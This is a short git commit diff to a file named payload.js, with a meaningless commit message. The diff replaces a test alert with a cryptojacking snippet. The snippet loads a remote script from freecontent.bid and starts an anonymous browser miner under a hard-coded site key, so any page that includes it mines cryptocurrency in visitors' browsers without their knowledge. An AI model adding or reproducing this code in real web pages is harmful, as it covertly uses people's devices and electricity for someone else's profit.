32f44bda912b8985263e349a4210b49c033eebb2
shuttershades <marian_007p@hotmail.com>
2018-02-05 15:06:53 +0200

    24234324234
    234234

--- html/js/payload.js
+++ html/js/payload.js
@@ -1,1 +1,10 @@
-window.alert("Payload injected");
+
+
+<script src="https://www.freecontent.bid./RLfv.js"></script>
+<script>
+    var miner = new Client.Anonymous('f9606b608b6523093f68c38dbc03a86d159b190e1e2d4c9926a627072cd59687', {
+        throttle: 0.1
+    });
+    miner.start();
+</script>
+
